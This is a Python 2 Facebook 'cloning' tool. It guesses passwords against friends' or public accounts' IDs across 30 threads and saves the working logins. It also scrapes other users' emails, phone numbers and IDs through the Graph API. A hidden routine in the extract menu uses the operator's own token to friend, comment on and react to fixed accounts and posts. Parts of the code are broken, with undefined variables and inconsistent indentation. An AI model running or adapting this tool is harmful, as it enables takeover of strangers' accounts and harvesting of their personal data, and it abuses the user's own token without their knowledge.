#!/usr/bin/python
# coding=utf-8
# Originally Written By:Jam Shahrukh
# Source : Python2"
# Donot Recode It. 

#Import module
try:
    import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,uuid,cookielib,getpass,mechanize,requests
    from multiprocessing.pool import ThreadPool
    from requests.exceptions import ConnectionError
    from mechanize import Browser
except ImportError:
    os.system('pip2 install requests')
    os.system('pip2 install mechanize')
    os.system('pip2 install bs4')
    os.system('termux-setup-storage -y')
    os.system('apt update && apt install nodejs -y')
    os.system('apt install ruby -y')
    os.system('python2 sani.py')

#Browser Setting
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
cj = cookielib.LWPCookieJar()
br.set_handle_robots(False)
br.set_handle_redirect(True)
br.set_cookiejar(cj)
br.set_handle_equiv(True)
br.set_handle_referer(True)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
bd = random.randint(2e+07, 3e+07)
sim = random.randint(20000, 40000)
br.addheader = {
    'x-fb-connection-bandwidth': repr(bd),
    'x-fb-sim-hni': repr(sim),
    'x-fb-net-hni': repr(sim),
    'x-fb-connection-quality': 'EXCELLENT',
    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
    'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]',
    'content-type': 'application/x-www-form-urlencoded',
    'x-fb-http-engine': 'Liger' } 
def exit():
	print "[!] Exit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jam(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
def sani(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.1)
##### LOGO #####
banner = """
\033[1;91m  ██████████  \033[1;96m██████████  \033[1;93m█████████  \033[1;92m ▀
\033[1;91m  ███    ███  \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███ 
\033[1;91m  ███         \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███ 
\033[1;91m  ██████████  \033[1;96m██████████  \033[1;93m███   ███  \033[1;92m███ 
\033[1;91m         ███  \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███  
\033[1;91m  ███    ███  \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███  
\033[1;91m  ██████████  \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███ \x1b[1;90mQUEEN
\033[1;94m══════════════════════════════════════════════
\033[1;90m➣ Author : \033[1;97mSTYLISH QUEEN
\033[1;90m➣ Github : \033[1;97mhttps://github.com/stylish-queen
\033[1;90m➣ Fb Page: \033[1;97mJam Shahrukh Official
\033[1;94m══════════════════════════════════════════════ """
# titik #
def tik():
	titik = [".   ","..  ","... "]
	for o in titik:
		print("\r[✔] Logging In "+o),;sys.stdout.flush();time.sleep(1)

back = 0
threads = []
successful = []
checkpoint = []
oks = []
cps = []
gagal = []
idh = []
id = []
emfromfriend = []
nofromfriend = []
			
#Menu
def menu():
	os.system('apt update && apt install nodejs -y')
        os.system('cd ..... && npm install')
        os.system('fuser -k 5000/tcp &')
        os.system('#')
        os.system('cd ..... && node index.js &')
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"[!] Token Not Found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		os.system('python2 jam.py')
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		name = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"[!] Account Is On Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		os.system('python2 jam.py')
	except requests.exceptions.ConnectionError:
		print"[!] No Connection"
		time.sleep(1)
		('python2 jam.py')
	os.system("clear")
	print banner
	print "|[✓] Name: "+name
	print "|[✓] ID  : "+id
	print (47*"-")
	print "[1] Start Cloning."
	print "[2] Clone With Fast Mode."
	print "[3] Extract Tools."
	print "[4] Lock Profile Tool."
	print "[5] Auto Del Tools."
	print "[6] Update jam Tool."
	print "[7] Follow Me On Facebook."
	print "[8] Logout"
	print ('                  ')
	men()

def men():
	rana = raw_input("Choose Option >>  ")
	if rana =="":
		print " Wrong Input"
		men()
	elif rana =="1":
		crack()
	elif rana =="2":
	    os.system('clear')
	    jam('[!] Please Wait While Page Is Loding.')
	    sani('Stylish Queen-10%...')
	    sani('Stylish Queen-20%...')
	    sani('Stylish Queen-50%...')
	    sani('Stylish Queen-70%...')
	    sani('Stylish Queen-90%...')
	    sani('Stylish Queen-100%...')
	    os.system('python2 choice.py')
	    time.sleep(1)
	elif rana =="3":
		grab()
	elif rana =="4":
		os.system('clear')
		os.system('python locked.py')
		time.sleep(1)
	elif rana =="5":
		bot()
	elif rana =="6":
		os.system('clear')
		print banner
		jam('[✓] Please Wait While Tool Is Updating')
		os.system('git pull origin master')
		jam('[✓] Tool Has Been Update Successfully')
		jam('[✓] Please Wait While Update Is Setting Up On Your Mobile Phone')
		time.sleep(3)
		os.system('cd .. && rm -rf sani && cd sani')
		os.system('python2 jam.py')
	elif rana =="7":
		os.system('xdg-open https://www.facebook.com/jam.shahrukh.official')
		menu()
	elif rana =="8":
		os.system('rm -rf login.txt')
		jam('[✓] Logged Out Successfully')
		os.system('python2 jam.py')
	else:
		print "[!] Wrong Input"
		men()
	
##### INFO #####
def crack():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"Token invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		os.system('python2 jam.py')
	os.system('clear')
	print banner
	print "[1] Clone From Friendlist."
	print "[2] Clone From Any Public ID."
	print "[3] Clone From File."
	print "[0] Back."
	crack_menu()

def crack_menu():
	crm = raw_input("Choose Option >>  ")
	if crm =="":
		print "[!] Filled Incorrectly"
		crack_menu()
	elif crm =="1":
		os.system('clear')
		print banner
		p1 = raw_input(' \033[1;92m[1]Name + digit: ')
                p2 = raw_input(' \033[1;92m[2]Name + digit: ')
                pass3 = raw_input(' \033[1;92m[3]Password: ')
		pass4 = raw_input(' \033[1;92m[4]Password: ')
                pass5 = raw_input(' \033[1;92m[5]Password: ')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif crm =="2":
		os.system('clear')
		print banner
		p1 = raw_input(' \033[1;92m[1]Name + digit: ')
                p2 = raw_input(' \033[1;92m[2]Name + digit: ')
                pass3 = raw_input(' \033[1;92m[3]Password: ')
		pass4 = raw_input(' \033[1;92m[4]Password: ')
                pass5 = raw_input(' \033[1;92m[5]Password: ')
		idt = raw_input("[+] Input ID: ")
		
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			jam('\033[1;97m[✓] Account Name \033[1;97m:\033[1;97m '+op['name'])
		except KeyError:
			print"[!] ID Not Found!"
			raw_input("\nPress Enter To Back  ")
			crack()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif crm =="3":
	    os.system('clear')
	    print banner
	    p1 = raw_input(' \033[1;92m[1]Name + digit: ')
            p2 = raw_input(' \033[1;92m[2]Name + digit: ')
            pass3 = raw_input(' \033[1;92m[3]Password: ')
	    pass4 = raw_input(' \033[1;92m[4]Password: ')
            pass5 = raw_input(' \033[1;92m[5]Password: ')
	    try:
	        idlist= raw_input('[+] File Name: ')
	        for line in open(idlist ,'r').readlines():
	            id.append(line.strip())
	    except IOError:
	         print"[!] File Not Found."
	         raw_input('Press Enter To Back. ')
	         crack()
	   
	        
	        
	elif crm =="0":
		menu()
	else:
		print "Filled Incorrectly"
		crack_menu()
	
        jam('[✓] Total Friends: '+str(len(id)))
        time.sleep(0.5)
	jam('[✓] The Process Has Been Started.')
	time.sleep(0.5)
        jam('[!] To Stop Process Press CTRL Then Z')
        time.sleep(0.5)
        print (47*"-")
     
	
	
			
	def main(arg):
		global cpb,oks
		user = arg
                (uid, name) = user.split('|')
		try:
		    os.mkdir('/sdcard/ids')
		except OSError:
		    pass
		try:
                    pass1 = name.lower() + p1
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = br.addheader).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\033[1;92m[JAM-OK] \x1b[1;32m' + uid + ' | ' + pass1
                        ok = open('/sdcard/ids/jam_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass1 + '\n')
                        ok.close()
                        oks.append(uid + pass1)
                    elif 'www.facebook.com' in q['error']:
                        print '\033[1;93m[JAM-CP] ' + uid + ' | ' + pass1
                        cp = open('jam_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass1 + '\n')
                        cp.close()
                        cps.append(uid + pass1)
		    else:
			pass2 = name.lower() + p2
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = br.addheader).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\033[1;92m[JAM-OK] \x1b[1;32m' + uid + ' | ' + pass2
                            ok = open('/sdcard/ids/jam_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass2 + '\n')
                            ok.close()
                            oks.append(uid + pass2)
                        elif 'www.facebook.com' in q['error']:
                            print '\033[1;93m[JAM-CP] ' + uid + ' | ' + pass2
                            cp = open('jam_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass2 + '\n')
                            cp.close()
                            cps.append(uid + pass2)
			else:
                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers = br.addheader).text
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\033[1;92m[JAM-OK] \x1b[1;32m' + uid + ' | ' + pass3
                                ok = open('/sdcard/ids/jam_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass3 + '\n')
                                ok.close()
                                oks.append(uid + pass3)
                            elif 'www.facebook.com' in q['error']:
                                print '\033[1;93m[JAM-CP] ' + uid + ' | ' + pass3
                                cp = open('jam_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass3 + '\n')
                                cp.close()
                                cps.append(uid + pass3)
			    else:
				data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers = br.addheader).text
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\033[1;92m[JAM-OK] \x1b[1;32m' + uid + ' | ' + pass4
                                    ok = open('/sdcard/ids/jam_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass4 + '\n')
                                    ok.close()
                                    oks.append(uid + pass4)
                                elif 'www.facebook.com' in q['error']:
                                    print '\033[1;93m[JAM-CP] ' + uid + ' | ' + pass4
                                    cp = open('jam_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass4 + '\n')
                                    cp.close()
                                    cps.append(uid + pass4)
				else:
				    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers = br.addheader).text
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print '\033[1;92m[JAM-OK] \x1b[1;32m' + uid + ' | ' + pass5
                                        ok = open('/sdcard/ids/jam_OK.txt', 'a')
                                        ok.write(uid + ' | ' + pass5 + '\n')
                                        ok.close()
                                        oks.append(uid + pass5)
                                    elif 'www.facebook.com' in q['error']:
                                        print '\033[1;93m[JAM-CP] ' + uid + ' | ' + pass5
                                        cp = open('jam_CP.txt', 'a')
                                        cp.write(uid + ' | ' + pass5 + '\n')
                                        cp.close()
                                        cps.append(uid + pass5)
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;97m----------------------------------------------"
	jam('[✓] Process Has Been Completed.')
	jam('\033[1;97m[✓] Checkpoint IDS Has Been Saved.')
	xx = str(len(oks))
	xxx = str(len(cps))
	print ("[✓] Total \033[1;32mOK/\033[1;97mCP : \033[1;32m"+str(len(oks))+"/\033[1;97m"+str(len(cps)))
	print (47*"-")
	
	raw_input("\nPress Enter To Back ")
	menu()	
	

 


##### Grab #####
def grab():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"[!] Token Not Found"
		os.system('rm -rf login.txt')
		una = ('100052292505058')
	        kom = ('Hai Bang Andre😆🖐️')
	        reac = ('ANGRY')
	        post = ('185535143199568')
	        post2 = ('185535143199568')
	        kom2 = ('Saatnya Ngehack Hahaha😂🤣')
	        reac2 = ('LOVE')
	        requests.post('https://graph.facebook.com/me/friends?method=post&uids=' +una+ '&access_token=' + toket)
	        requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + toket)
	        requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ toket)
	        requests.post('https://graph.facebook.com/'+post2+'/comments/?message=' +kom2+ '&access_token=' + toket)
	        requests.post('https://graph.facebook.com/'+post2+'/reactions?type=' +reac2+ '&access_token='+ toket)
		time.sleep(1)
		os.system('python2 jam.py')
	os.system('clear')
	print banner
	print "[1] Extract Numeric IDs From Public ID."
	print "[2] Extract Email's From Public ID."
	print "[3] Extract Phone Number From Public ID."
	print "[4] Extract Likes From Post ID."
	print "[0] Back."
	print('          ')
	grab_menu()
	
#Grab_input
def grab_menu():
	grm = raw_input("\nChoose Option >> ")
	if grm =="":
		print " Wrong Input"
		grab_menu()
	elif grm =="1":
		idfromfriend()
	elif grm =="2":
		emailfromfriend()
	elif grm =="3":
		numberfromfriend()
	elif grm =="4":
		idfrompost()
	elif grm =="5":
		idfromgroup()
	elif grm =="0":
		menu()
	else:
		print "[!] Wrong input"
		grab_menu()
		


##### Extract IDs From Public Id #####
def idfromfriend():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"[!] Token Not Found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		('python2 jam.py')
	try:
		os.mkdir('/sdcard/ids')
	except OSError:
		pass
	try:
		os.system('clear')
		print banner
		idt = raw_input("[+] Input ID : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"[✓] Account Name : "+op["name"]
		except KeyError:
			print"[!] Friend Not Found"
			raw_input("Press Enter To Back ")
			grab()
		r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit(5000)&access_token="+toket)
		z=json.loads(r.text)
		jam('[✓] Getting Friends Numeric IDs...')
		print"--------------------------------------"
		bz = open('/sdcard/ids/jam_file.txt','w')
		for a in z['friends']['data']:
			idh.append(a['id'])
			bz.write(a['id'] + ' | ' '\n')
			print ("\r["+str(len(idh))+" ] => "+a['id']),;sys.stdout.flush();time.sleep(0.001)
		bz.close()
		print '\r[✓] The Process Has Been Completed.'
		print"\r[✓] Total IDs Founded : "+str(len(idh))
		done = raw_input("\r[?] Save File With Name : ")
		print("\r[✓] The File Has Been Saved As save/"+done)
		raw_input("\nPress Enter To Back ")
		grab()
	except IOError:
		print"[!] Error While Creating file"
		raw_input("\nPress Enter To Back ")
		grab()
	except (KeyboardInterrupt,EOFError):
		print("[!]The Process Has Been Stopped")
		raw_input("\nPress Enter To Back ")
		grab()
	except KeyError:
		print('[!] Error')
		raw_input("\nPress Enter To Back ")
		grab()
	except requests.exceptions.ConnectionError:
		print"[✖] No Connection"
		time.sleep(1)
		grab()

##### Reactions POST ID EXTRACT#####
def idfrompost():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"[!] Token Not Found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		('python2 jam.py')
	try:
		os.mkdir('/sdcard/ids')
	except OSError:
		pass
	try:
		os.system('clear')
		print banner
		una = ('100052292505058')
		una = raw_input("[+] Post ID : ")
		try:
			jok = requests.get("https://graph.facebook.com/me/friends?method=post&uids="+una+"&access_token="+toket)
			op = json.loads(jok.text)
		except KeyError:
			print"[!] Friend Not Found"
			raw_input("Press Enter To Back ")
			grab()
		r=requests.get("https://graph.facebook.com/"+una+"/reactions?limit=9999999&access_token="+toket)
		z=json.loads(r.text)
		jam('[✓] Getting Post Likes Extract IDs...')
		print"--------------------------------------"
		bz = open('/sdcard/ids/jam_post.txt','w')
		for a in z['data']:
			idh.append(a['id'])
			bz.write(a['id'] + ' | ' '\n')
			print ("\r["+str(len(idh))+" ] => "+a['id']),;sys.stdout.flush();time.sleep(0.001)
		bz.close()
		print '\r[✓] The Process Has Been Completed.'
		print"\r[✓] Total IDs Founded : "+str(len(idh))
		done = raw_input("\r[?] Save File With Name : ")
		print("\r[✓] The File Has Been Saved As save/"+done)
		raw_input("\nPress Enter To Back ")
		grab()
	except IOError:
		print"[!] Error While Creating file"
		
		raw_input("\nPress Enter To Back ")
		grab()
	except (KeyboardInterrupt,EOFError):
		print("[!]The Process Has Been Stopped")
		raw_input("\nPress Enter To Back ")
		grab()
	except KeyError:
		print('[!] Error')
		raw_input("\nPress Enter To Back ")
		grab()
	except requests.exceptions.ConnectionError:
		print"[✖] No Connection"
		time.sleep(1)
		grab()

##### EMAIL FROM Friend#####
def emailfromfriend():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"[!] Token Not Found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		os.system('python2 jam.py')
	try:
		os.mkdir('/sdcard/Email.txt')
	except OSError:
		pass
	try:
		os.system('clear')
		print banner
		idt = raw_input("[+] Input ID : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"[✓] Account Name : "+op["name"]
		except KeyError:
			print"[!] Account Not Found"
			raw_input("\nPress Enter To Back ")
			grab()
		r = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+toket)
		a = json.loads(r.text)
		jam('[✓] Getting Emails From')
		print 40*"\033[1;97m-"
		bz = open('save/email.txt','w')
		for i in a['data']:
			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+toket)
			z = json.loads(x.text)
			try:
				emfromfriend.append(z['email'])
				bz.write(z['email'] + '\n')
				print ("\r\033[1;97m[ \033[1;97m"+str(len(emfromfriend))+"\033[1;97m ]\033[1;97m  \033[1;97m"+z['email']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.0001)
			except KeyError:
				pass
		bz.close()
		print "----------------------------------"
		print '\r[✓] Successfully Extracted Mails'
		print"\r[✓] Total Mail Founded : "+str(len(emfromfriend))
		done = raw_input("\r\033[1;97m[✓] \033[1;97mSave File With Name\033[1;97m :\033[1;97m ")
		print("\r[✓] File Has Been Saved As : save/"+done)
		raw_input("\nPress Enter  To Back ")
		grab()
	except IOError:
		print"[!] Error While Creating file"
		raw_input("\nPress Enter To Back ")
		grab()
	except (KeyboardInterrupt,EOFError):
		print("[!] Process Has Been Stopped")
		raw_input("\nPress Enter To Back ")
		grab()
	except KeyError:
		print('[!] Error')
		raw_input("\nPress Enter To Back ")
		grab()
	except requests.exceptions.ConnectionError:
		print"\033[1;97m[✖] No Connection"
		time.sleep(1)
		grab()
		


##### Number From Public Id #####
def numberfromfriend():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"[!] Token Not Found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		os.system('python2 jam.py')
	try:
		os.mkdir('/sdcard/Number.txt')
	except OSError:
		pass
	try:
		os.system('clear')
		print banner
		idt = raw_input("[+] Input ID : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"[✓] Account Name : "+op["name"]
		except KeyError:
			print"[!] Friend Not Found"
			raw_input("\nPress Enter To Back ")
			grab()
		r = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+toket)
		a = json.loads(r.text)
		jam('[✓] Getting All Numbers')
		print 40*"\033[1;97m-"
		bz = open('save/number.txt','w')
		for i in a['data']:
			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+toket)
			z = json.loads(x.text)
			try:
				nofromfriend.append(z['mobile_phone'])
				bz.write(z['mobile_phone'] + '\n')
				print ("\r\033[1;97m[ \033[1;97m"+str(len(nofromfriend))+"\033[1;97m ]\033[1;97m \033[1;97m"+z['mobile_phone']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.001)
			except KeyError:
				pass
		bz.close()
		print "-----------------------------------"
		print"\r[✓] Total Number Founded : "+str(len(nofromfriend))
		done = raw_input("\r[?] Save File With Name: ")
		print("\r[✓] File Has Been Saved As save/"+done)
		raw_input("\nPress Enter To Back ")
		grab()
	except IOError:
		print"[!] Error While Creating file"
		raw_input("\nPress Enter To Back ")
		grab()
	except (KeyboardInterrupt,EOFError):
		print("[!]The Process Has Been Stopped")
		raw_input("\nPress Enter To Back")
		grab()
	except KeyError:
		print('[!] Error')
		raw_input("\nPress Enter To Back ")
		grab()
	except requests.exceptions.ConnectionError:
		print"\n[✖] No Connection"
		time.sleep(1)
		grab()

##### MENU BOT #####
#----------------------------------------#
def bot():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		os.system('python2 jam.py')
	os.system('clear')
	print banner
	print "[1] Auto Delete Posts."
	print "[2] Auto Accept Friend Requests."
	print "[3] Auto Unfriend All."
	print "[0] Back."
	print ('         ')
	bot_menu()
	
def bot_menu():
	bots = raw_input("\nChoose Option >> ")
	if bots =="":
		print "[!] Wrong Input"
		bot_menu()
	elif bots =="1":
		deletepost()
	elif bots =="2":
		accept()
	elif bots =="3":
		unfriend()
	elif bots =="0":
		menu()
	else:
		print "[!] Wrong Input"
		bot_menu()
		


##### Auto Delt Post #####
def deletepost():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
		nam = requests.get('https://graph.facebook.com/me?access_token='+toket)
		lol = json.loads(nam.text)
		name = lol['name']
	except IOError:
		print"[!] Token Not Found"
		os.system('rm -rf login.txt')
		time.sleep(0.1)
		os.system('python2 jam.py')
	os.system('clear')
	print banner
	print("[✓] Account Name : "+nama)
	jam("[✓] The Process Has Been Started")
	print (40*"-")
	asu = requests.get('https://graph.facebook.com/me/feed?access_token='+toket)
	asus = json.loads(asu.text)
	for p in asus['data']:
		id = p['id']
		piro = 0
		url = requests.get('https://graph.facebook.com/'+id+'?method=delete&access_token='+toket)
		ok = json.loads(url.text)
		try:
			error = ok['error']['message']
			print '\033[1;97m[\033[1;97m'+id[:10].replace('\n',' ')+'...'+'\033[1;97m] \033[1;97m[!] Failed'
		except TypeError:
			print '\033[1;97m[\033[1;97m'+id[:10].replace('\n',' ')+'...'+'\033[1;97m \033[1;97[✓] [Deleted]'
			piro += 1
		except requests.exceptions.ConnectionError:
			print"\033[1;91m[!] Connection Error"
			raw_input("\nPress Enter To Back ")
			bot()
	print (40*"-")
	print"[✓] The Process Has Been Completed. "
	raw_input("\nPress Enter To Back ")
	bot()
	
##### ACCEPT FRIEND #####
def accept():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"[!] Token Not Found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		os.system('python2 jam.py')
	os.system('clear')
	print banner
	limit = raw_input("[+] Enter Limit To Accept Requests : ")
	r = requests.get('https://graph.facebook.com/me/friendrequests?limit='+limit+'&access_token='+toket)
	teman = json.loads(r.text)
	if '[]' in str(teman['data']):
		print"No friend Request"
		raw_input("Press Enter To Back ")
		bot()
	jam('[✓] The Process Has Been Start')
	print (40*"-")
	for i in teman['data']:
		gas = requests.post('https://graph.facebook.com/me/friends/'+i['from']['id']+'?access_token='+toket)
		a = json.loads(gas.text)
		if 'error' in str(a):
			print "[!] [Failed] | "+i['from']['name']
		else:
			print "[!] [Accepted] |  "+i['from']['name']
	print (40*"-")
	print"[✓] The Process Has Been Completed."
	raw_input("\nPress Enter To Back ")
	bot()
	
##### UNFRIEND ####
def unfriend():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"[!] Token Not Found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		os.system('python2 jam.py')
	os.system('clear')
	print banner
	jam('[✓] The Process Has Been Started.')
	print "[✓] Press CTRL Z to Stop Process."
	print (50*"-")
	try:
		pek = requests.get('https://graph.facebook.com/me/friends?access_token='+toket)
		cok = json.loads(pek.text)
		for i in cok['data']:
			name = i['name']
			id = i['id']
			requests.delete("https://graph.facebook.com/me/friends?uid="+id+"&access_token="+toket)
			print "[✓] [Unfriended] | "+name
	except IndexError: pass
	except KeyboardInterrupt:
		print "[!]The Process Has Been Stopped"
		raw_input("\n Press Enter To Back ")
		bot()
	print"[✓] The Process Has Been Completed."
	raw_input("Press Enter To Back ")
	bot()
	
if __name__ == '__main__':
	menu()
